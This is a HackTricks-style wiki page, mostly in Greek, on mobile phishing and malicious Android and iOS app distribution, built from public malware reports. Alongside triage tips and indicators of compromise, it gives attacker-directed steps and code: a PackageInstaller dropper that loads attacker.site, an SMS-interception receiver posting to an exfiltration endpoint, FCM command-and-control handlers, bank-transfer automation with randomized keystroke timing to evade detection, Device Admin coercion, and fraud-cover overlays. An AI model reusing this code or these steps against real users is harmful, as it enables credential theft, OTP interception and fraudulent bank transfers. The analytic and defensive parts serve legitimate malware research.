# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Αυτή η σελίδα καλύπτει τεχνικές που χρησιμοποιούν threat actors για τη διανομή **malicious Android APKs** και **iOS mobile-configuration profiles** μέσω phishing (SEO, social engineering, fake stores, dating apps, κ.λπ.).
> Το υλικό είναι προσαρμοσμένο από την καμπάνια SarangTrap που αποκαλύφθηκε από το Zimperium zLabs (2025) και άλλες δημόσιες έρευνες.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Εγγράψτε δεκάδες domains που μοιάζουν μεταξύ τους (dating, cloud share, car service…).
– Χρησιμοποιήστε τοπικές λέξεις-κλειδιά και emojis στο στοιχείο `<title>` για να κατατάσσεστε στο Google.
– Φιλοξενήστε *και* Android (`.apk`) και iOS install instructions στην ίδια landing page.
2. **First Stage Download**
* Android: άμεσος σύνδεσμος σε ένα *unsigned* ή “third-party store” APK.
* iOS: `itms-services://` ή απλό HTTPS link σε ένα malicious **mobileconfig** profile (βλ. παρακάτω).
3. **Post-install Social Engineering**
* Στο πρώτο run η app ζητά έναν **invitation / verification code** (ψευδαίσθηση αποκλειστικής πρόσβασης).
* Ο κώδικας **POSTed over HTTP** στο Command-and-Control (C2).
* Το C2 απαντά `{"success":true}` ➜ το malware συνεχίζει.
* Sandbox / AV dynamic analysis που δεν υποβάλλει ποτέ έγκυρο code βλέπει **no malicious behaviour** (evasion).
4. **Runtime Permission Abuse** (Android)
* Τα dangerous permissions ζητούνται μόνο **μετά από θετική C2 response**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Πρόσφατες παραλλαγές **αφαιρούν το `<uses-permission>` για SMS από το `AndroidManifest.xml`** αλλά αφήνουν το Java/Kotlin code path που διαβάζει SMS μέσω reflection ⇒ μειώνει το static score ενώ παραμένει λειτουργικό σε συσκευές που δίνουν την permission μέσω `AppOps` abuse ή παλιών targets.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Το Android 13 εισήγαγε τα **Restricted settings** για sideloaded apps: τα toggles Accessibility και Notification Listener είναι γκριζαρισμένα μέχρι ο χρήστης να επιτρέψει ρητά τα restricted settings στο **App info**.
* Οι phishing pages και droppers πλέον περιλαμβάνουν βήμα-βήμα UI instructions για να **allow restricted settings** για το sideloaded app και μετά να ενεργοποιηθεί το Accessibility/Notification access.
* Ένα νεότερο bypass είναι η εγκατάσταση του payload μέσω **session-based PackageInstaller flow** (η ίδια μέθοδος που χρησιμοποιούν τα app stores). Το Android αντιμετωπίζει την app ως store-installed, άρα τα Restricted settings δεν μπλοκάρουν πλέον το Accessibility.
* Triage hint: σε ένα dropper, grep για `PackageInstaller.createSession/openSession` μαζί με code που αμέσως μεταφέρει το θύμα στο `ACTION_ACCESSIBILITY_SETTINGS` ή `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* Η app δείχνει ακίνδυνες views (SMS viewer, gallery picker) υλοποιημένες τοπικά.
* Ταυτόχρονα exfiltrates:
- IMEI / IMSI, phone number
- Full `ContactsContract` dump (JSON array)
- JPEG/PNG από `/sdcard/DCIM` compressed με [Luban](https://github.com/Curzibn/Luban) για μείωση μεγέθους
- Προαιρετικό SMS content (`content://sms`)
Τα payloads είναι **batch-zipped** και αποστέλλονται μέσω `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* Ένα μόνο **mobile-configuration profile** μπορεί να ζητήσει `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` κ.λπ. ώστε να εγγράψει τη συσκευή σε supervision τύπου “MDM”.
* Social-engineering instructions:
1. Ανοίξτε Settings ➜ *Profile downloaded*.
2. Πατήστε *Install* τρεις φορές (screenshots στη phishing page).
3. Trust the unsigned profile ➜ ο attacker αποκτά *Contacts* & *Photo* entitlement χωρίς App Store review.
8. **iOS Web Clip Payload (phishing app icon)**
* Τα `com.apple.webClip.managed` payloads μπορούν να **pin a phishing URL to the Home Screen** με branded icon/label.
* Τα Web Clips μπορούν να εκτελούνται **full-screen** (κρύβει το browser UI) και να επισημαίνονται ως **non-removable**, αναγκάζοντας το θύμα να διαγράψει το profile για να αφαιρέσει το icon.
9. **Network Layer**
* Plain HTTP, συχνά στη port 80 με HOST header όπως `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → εύκολο να εντοπιστεί).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Κατά την αξιολόγηση malware, αυτοματοποιήστε τη φάση του invitation code με Frida/Objection για να φτάσετε στο malicious branch.
* **Manifest vs. Runtime Diff** – Συγκρίνετε `aapt dump permissions` με runtime `PackageManager#getRequestedPermissions()`; missing dangerous perms είναι red flag.
* **Network Canary** – Ρυθμίστε `iptables -p tcp --dport 80 -j NFQUEUE` για να εντοπίζετε unsolid POST bursts μετά την εισαγωγή code.
* **mobileconfig Inspection** – Χρησιμοποιήστε `security cms -D -i profile.mobileconfig` στο macOS για να απαριθμήσετε το `PayloadContent` και να εντοπίσετε excessive entitlements.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Δείκτες (Generic)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Αυτό το pattern έχει παρατηρηθεί σε campaigns που καταχρώνται θέματα κυβερνητικών παροχών για να κλέψουν Indian UPI credentials και OTPs. Οι operators αλυσοδένουν αξιόπιστες πλατφόρμες για delivery και resilience.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site που μιμείται το legit portal
- Το ίδιο GitHub repo φιλοξενεί ένα APK με fake “Google Play” badge που συνδέει απευθείας στο file
- Dynamic phishing pages ζουν στο Replit; το remote command channel χρησιμοποιεί Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Το πρώτο APK είναι installer (dropper) που περιλαμβάνει το πραγματικό malware στο `assets/app.apk` και προτρέπει τον user να απενεργοποιήσει Wi‑Fi/mobile data για να περιορίσει το cloud detection.
- Το embedded payload εγκαθίσταται με ένα αθώο label (π.χ. “Secure Update”). Μετά την εγκατάσταση, τόσο ο installer όσο και το payload υπάρχουν ως ξεχωριστά apps.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Δυναμική ανακάλυψη endpoint μέσω shortlink
- Το malware ανακτά μια απλή κείμενη, διαχωρισμένη με κόμματα λίστα από live endpoints από ένα shortlink· απλοί string transforms παράγουν το τελικό path της phishing σελίδας.

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Ψευδοκώδικας:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Συγκομιδή διαπιστευτηρίων UPI με βάση το WebView
- Το βήμα “Make payment of ₹1 / UPI‑Lite” φορτώνει μια HTML φόρμα του επιτιθέμενου από το dynamic endpoint μέσα σε ένα WebView και καταγράφει ευαίσθητα πεδία (phone, bank, UPI PIN) τα οποία στέλνονται με `POST` στο `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Αυτο-διάδοση και υποκλοπή SMS/OTP
- Ζητούνται επιθετικά permissions κατά την πρώτη εκτέλεση:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Οι επαφές χρησιμοποιούνται για μαζική αποστολή smishing SMS από τη συσκευή του θύματος.
- Τα εισερχόμενα SMS παρεμποδίζονται από έναν broadcast receiver και ανεβαίνουν μαζί με metadata (αποστολέας, body, SIM slot, per-device random ID) στο `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) ως ανθεκτικό C2
- Το payload εγγράφεται στο FCM· τα push messages μεταφέρουν ένα πεδίο `_type` που χρησιμοποιείται ως switch για να ενεργοποιεί ενέργειες (π.χ., ενημέρωση phishing text templates, εναλλαγή behaviours).

Παράδειγμα FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Το σκίτσο του Handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Δείκτες/IOCs
- Το APK περιέχει δευτερεύον payload στο `assets/app.apk`
- Το WebView φορτώνει πληρωμή από `gate.htm` και κάνει exfiltration στο `/addup.php`
- SMS exfiltration στο `/addsm.php`
- Λήψη config μέσω shortlink-driven (π.χ. `rebrand.ly/*`) που επιστρέφει CSV endpoints
- Apps με γενικές ετικέτες “Update/Secure Update”
- FCM `data` messages με discriminator `_type` σε untrusted apps

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Οι attackers αντικαθιστούν ολοένα και περισσότερο τα static APK links με ένα Socket.IO/WebSocket channel ενσωματωμένο σε lures που μοιάζουν με το Google Play. Αυτό κρύβει το payload URL, παρακάμπτει URL/extension filters και διατηρεί ένα ρεαλιστικό install UX.

Τυπικό client flow που παρατηρείται στο πεδίο:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Γιατί παρακάμπτει απλούς ελέγχους:
- Δεν εκτίθεται στατικό APK URL· το payload ανασυντίθεται στη μνήμη από WebSocket frames.
- URL/MIME/extension filters που μπλοκάρουν άμεσες .apk απαντήσεις μπορεί να χάσουν binary data που μεταφέρεται μέσω WebSockets/Socket.IO.
- Crawlers και URL sandboxes που δεν εκτελούν WebSockets δεν θα ανακτήσουν το payload.

Δείτε επίσης WebSocket tradecraft και tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

Η καμπάνια banker/RAT RatOn (ThreatFabric) είναι ένα συγκεκριμένο παράδειγμα του πώς οι σύγχρονες mobile phishing επιχειρήσεις συνδυάζουν WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), takeover crypto wallet, και ακόμη orchestration NFC-relay. Αυτή η ενότητα αφαιρεί τις επαναχρησιμοποιήσιμες τεχνικές.

### Stage-1: WebView → native install bridge (dropper)
Οι επιτιθέμενοι παρουσιάζουν ένα WebView που δείχνει σε attacker page και εισάγουν ένα JavaScript interface που εκθέτει έναν native installer. Ένα tap σε ένα HTML button καλεί native code που εγκαθιστά ένα second-stage APK bundled στα assets του dropper και μετά το εκκινεί απευθείας.

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML στη σελίδα:
```html
<button onclick="bridge.installApk()">Install</button>
```
Μετά την εγκατάσταση, το dropper ξεκινά το payload μέσω explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting ιδέα: untrusted apps που καλούν `addJavascriptInterface()` και εκθέτουν installer-like μεθόδους στο WebView· APK που μεταφέρει ενσωματωμένο secondary payload υπό `assets/` και καλεί το Package Installer Session API.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Το Stage-2 ανοίγει ένα WebView που φιλοξενεί μια σελίδα “Access”. Το κουμπί της καλεί μια exported μέθοδο που πλοηγεί το θύμα στις ρυθμίσεις Accessibility και ζητά την ενεργοποίηση του rogue service. Μόλις δοθεί η άδεια, το malware χρησιμοποιεί Accessibility για να κάνει auto-click μέσω των επόμενων runtime permission dialogs (contacts, overlay, manage system settings, κ.λπ.) και ζητά Device Admin.

- Η Accessibility βοηθά programmatically να αποδεχτεί τα επόμενα prompts βρίσκοντας κουμπιά όπως “Allow”/“OK” στο node-tree και στέλνοντας clicks.
- Έλεγχος/αίτημα για overlay permission:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Οι operators μπορούν να δώσουν εντολές για να:
- αποδώσουν ένα full-screen overlay από ένα URL, ή
- περάσουν inline HTML που φορτώνεται σε ένα WebView overlay.

Πιθανές χρήσεις: coercion (PIN entry), άνοιγμα wallet για capture PINs, ransom messaging. Κράτα μια εντολή για να διασφαλίζεις ότι το overlay permission είναι granted αν λείπει.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: περιοδικά dump το Accessibility node tree, serialize τα visible texts/roles/bounds και στείλ’ τα στο C2 ως pseudo-screen (commands όπως `txt_screen` μία φορά και `screen_live` συνεχόμενα).
- High-fidelity: ζήτησε MediaProjection και ξεκίνα screen-casting/recording on demand (commands όπως `display` / `record`).

### ATS playbook (bank app automation)
Δεδομένου ενός JSON task, άνοιξε το bank app, οδήγησε το UI μέσω Accessibility με ένα μείγμα από text queries και coordinate taps, και εισήγαγε το payment PIN του θύματος όταν ζητηθεί.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Παραδείγματα κειμένων που φαίνονται σε μία στοχευμένη ροή (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Οι operators μπορούν επίσης να ελέγξουν/αυξήσουν τα transfer limits μέσω εντολών όπως `check_limit` και `limit` που πλοηγούν στο limits UI με παρόμοιο τρόπο.

### Crypto wallet seed extraction
Στόχοι όπως MetaMask, Trust Wallet, Blockchain.com, Phantom. Ροή: unlock (stolen PIN or provided password), πλοήγηση σε Security/Recovery, αποκάλυψη/εμφάνιση seed phrase, keylog/exfiltrate it. Υλοποιήστε locale-aware selectors (EN/RU/CZ/SK) για να σταθεροποιήσετε την πλοήγηση σε διαφορετικές γλώσσες.

### Device Admin coercion
Τα Device Admin APIs χρησιμοποιούνται για να αυξήσουν τις ευκαιρίες PIN-capture και να δυσκολέψουν το θύμα:

- Immediate lock:
```java
dpm.lockNow();
```
- Λήξη τρέχοντος credential για να επιβληθεί αλλαγή (το Accessibility καταγράφει νέο PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Εξαναγκάστε ξεκλείδωμα χωρίς βιομετρικά απενεργοποιώντας τις βιομετρικές λειτουργίες του keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Πολλά controls του `DevicePolicyManager` απαιτούν `Device Owner`/`Profile Owner` σε πρόσφατα Android· ορισμένα OEM builds μπορεί να είναι πιο χαλαρά. Πάντα επαληθεύετε στο target OS/OEM.

### NFC relay orchestration (NFSkate)
Το Stage-3 μπορεί να εγκαταστήσει και να εκκινήσει ένα external NFC-relay module (π.χ. NFSkate) και ακόμη να του περάσει ένα HTML template για να καθοδηγήσει το θύμα κατά τη διάρκεια του relay. Αυτό επιτρέπει contactless card-present cash-out παράλληλα με online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: ανθρώπινος ρυθμός κειμένου και dual text injection (Herodotus)

Οι απειλητικοί φορείς συνδυάζουν ολοένα και περισσότερο Accessibility-driven automation με anti-detection προσαρμοσμένο απέναντι σε basic behaviour biometrics. Ένα πρόσφατο banker/RAT δείχνει δύο συμπληρωματικές λειτουργίες παράδοσης κειμένου και ένα operator toggle για προσομοίωση ανθρώπινου typing με randomized cadence.

- Discovery mode: απαρίθμηση ορατών nodes με selectors και bounds για ακριβή στόχευση inputs (ID, text, contentDescription, hint, bounds) πριν από την ενέργεια.
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` απευθείας στο target node (σταθερό, χωρίς keyboard);
- Mode 2 – ρύθμιση clipboard + `ACTION_PASTE` στο focused node (λειτουργεί όταν το direct setText μπλοκάρεται).
- Human-like cadence: διαίρεση του operator-provided string και παράδοσή του χαρακτήρα-χαρακτήρα με randomized 300–3000 ms delays μεταξύ events για αποφυγή heuristics “machine-speed typing”. Υλοποιείται είτε αυξάνοντας προοδευτικά την τιμή μέσω `ACTION_SET_TEXT`, είτε κάνοντας paste ένα char τη φορά.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Blocking overlays for fraud cover:
- Αποδώστε ένα πλήρους οθόνης `TYPE_ACCESSIBILITY_OVERLAY` με opacity ελεγχόμενο από τον operator· κρατήστε το opaque για το θύμα ενώ ο remote automation συνεχίζει από κάτω.
- Οι εντολές που συνήθως εκτίθενται: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimal overlay with adjustable alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator control primitives often seen: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (κοινή χρήση οθόνης).

## Android dropper πολλαπλών σταδίων με WebView bridge, αποκωδικοποιητή συμβολοσειρών JNI και φορτώση DEX σε στάδια

Η ανάλυση της CERT Polska στις 03 Απριλίου 2026 για το **cifrat** είναι μια καλή αναφορά για ένα σύγχρονο Android loader που διανέμεται μέσω phishing, όπου το ορατό APK είναι μόνο ένα installer shell. Η επαναχρησιμοποιήσιμη τεχνική δεν είναι το όνομα της οικογένειας, αλλά ο τρόπος με τον οποίο συνδέονται τα στάδια:

1. Η phishing σελίδα παραδίδει ένα lure APK.
2. Το Stage 0 ζητά `REQUEST_INSTALL_PACKAGES`, φορτώνει ένα native `.so`, αποκρυπτογραφεί ένα ενσωματωμένο blob και εγκαθιστά το stage 2 με **PackageInstaller sessions**.
3. Το Stage 2 αποκρυπτογραφεί ένα άλλο κρυφό asset, το αντιμετωπίζει ως ZIP και **φορτώνει δυναμικά DEX** για το τελικό RAT.
4. Το τελικό στάδιο καταχράται Accessibility/MediaProjection και χρησιμοποιεί WebSockets για control/data.

### WebView JavaScript bridge ως ελεγκτής του installer

Αντί να χρησιμοποιείται το WebView μόνο για ψεύτικο branding, το lure μπορεί να εκθέτει ένα bridge που επιτρέπει σε μια τοπική/απομακρυσμένη σελίδα να fingerprint το device και να ενεργοποιεί native λογική εγκατάστασης:
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
Ιδέες τριάζ:
- grep για `addJavascriptInterface`, `@JavascriptInterface`, `loadUrl("file:///android_asset/` και remote phishing URLs που χρησιμοποιούνται στην ίδια activity
- παρακολούθησε για bridges που εκθέτουν installer-like methods (`start`, `install`, `openAccessibility`, `requestOverlay`)
- αν το bridge υποστηρίζεται από phishing page, αντιμετώπισέ το ως operator/controller surface, όχι απλώς ως UI

### Native string decoding registered in `JNI_OnLoad`

Ένα χρήσιμο pattern είναι μια Java method που φαίνεται αθώα αλλά στην πραγματικότητα υποστηρίζεται από `RegisterNatives` κατά το `JNI_OnLoad`. Στο cifrat, ο decoder αγνοούσε τον πρώτο char, χρησιμοποιούσε τον δεύτερο ως 1-byte XOR key, hex-decoded το υπόλοιπο, και μετέτρεπε κάθε byte ως `((b - i) & 0xff) ^ key`.

Minimal offline reproduction:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
Χρησιμοποίησε αυτό όταν βλέπεις:
- repeated calls to one native-backed Java method for URLs, package names, or keys
- `JNI_OnLoad` resolving classes and calling `RegisterNatives`
- no meaningful plaintext strings in DEX, but many short hex-looking constants passed into one helper

### Layered payload staging: XOR resource -> installed APK -> RC4-like asset -> ZIP -> DEX

Αυτή η οικογένεια χρησιμοποίησε δύο layers αποσυμπίεσης που αξίζει να τα κυνηγάς γενικά:

- **Stage 0**: decrypt `res/raw/*.bin` με ένα XOR key που προκύπτει μέσω του native decoder, μετά install το plaintext APK μέσω `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit`
- **Stage 2**: extract ένα ακίνδυνο-looking asset όπως `FH.svg`, decrypt it με μια RC4-like routine, parse το result ως ZIP, και μετά load hidden DEX files

Αυτό είναι ισχυρή ένδειξη πραγματικού dropper/loader pipeline, επειδή κάθε layer κρατά το επόμενο stage opaque για basic static scanning.

Quick triage checklist:
- `REQUEST_INSTALL_PACKAGES` plus `PackageInstaller` session calls
- receivers for `PACKAGE_ADDED` / `PACKAGE_REPLACED` to continue the chain after install
- encrypted blobs under `res/raw/` or `assets/` with non-media extensions
- `DexClassLoader` / `InMemoryDexClassLoader` / ZIP handling close to custom decryptors

### Native anti-debugging through `/proc/self/maps`

Το native bootstrap επίσης σάρωσε το `/proc/self/maps` για `libjdwp.so` και aborted αν υπήρχε. Αυτό είναι ένα πρακτικό early anti-analysis check επειδή το JDWP-backed debugging αφήνει μια αναγνωρίσιμη mapped library:
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
Ιδέες για hunting:
- grep native code / decompiler output for `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu`
- αν τα Frida hooks φτάνουν πολύ αργά, εξέτασε πρώτα `.init_array` και `JNI_OnLoad`
- αντιμετώπισε το anti-debug + string decoder + staged install ως ένα cluster, όχι ως ανεξάρτητα findings

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
